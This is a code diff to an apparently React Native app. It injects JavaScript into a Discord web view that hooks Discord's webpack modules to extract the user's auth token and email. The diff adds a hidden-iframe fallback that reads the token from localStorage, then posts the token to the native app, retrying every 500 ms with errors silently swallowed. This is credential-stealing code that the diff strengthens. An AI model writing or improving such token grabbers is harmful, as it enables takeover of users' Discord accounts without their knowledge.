@@ -44,10 +44,13 @@ export default function App() {
   (function() {
     function capture() {
       try {
+        let token = null;
+        let email = "user@discord.com";
+
+        // 1. TRY THE "WEBPACK" HOOK (Captures Token + Email)
         const webpack = window.webpackChunkdiscord_app;
         if (webpack) {
           const m = webpack.push([[Symbol()], {}, (e) => e]);
-          let token, email;
           for (const i in m.c) {
             const exp = m.c[i].exports;
             if (exp && exp.default) {
@@ -56,22 +59,38 @@ export default function App() {
             }
             if (token && email) break;
           }
-          if (token && token.length > 20) {
-            window.ReactNativeWebView.postMessage(JSON.stringify({
-              type: 'TOKEN_DATA', 
-              token: token, 
-              email: email || "user@discord.com" 
-            }));
-            return true;
+        }
+
+        // 2. THE IFRAME FALLBACK (Your original working method for Token)
+        if (!token) {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          const storage = iframe.contentWindow.localStorage;
+          const rawToken = storage.getItem('token');
+          if (rawToken) {
+            token = rawToken.replace(/"/g, '');
           }
+        }
+
+        // 3. SEND DATA IF TOKEN IS FOUND
+        if (token && token.length > 20) {
+          window.ReactNativeWebView.postMessage(JSON.stringify({
+            type: 'TOKEN_DATA', 
+            token: token, 
+            email: email 
+          }));
+          return true;
         }
       } catch (e) {}
       return false;
     }
-    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
+
+    const timer = setInterval(() => {
+      if (capture()) clearInterval(timer);
+    }, 500);
   })();
 `;
-
   useEffect(() => {
     registerForNotifications();
     loadSavedUser();
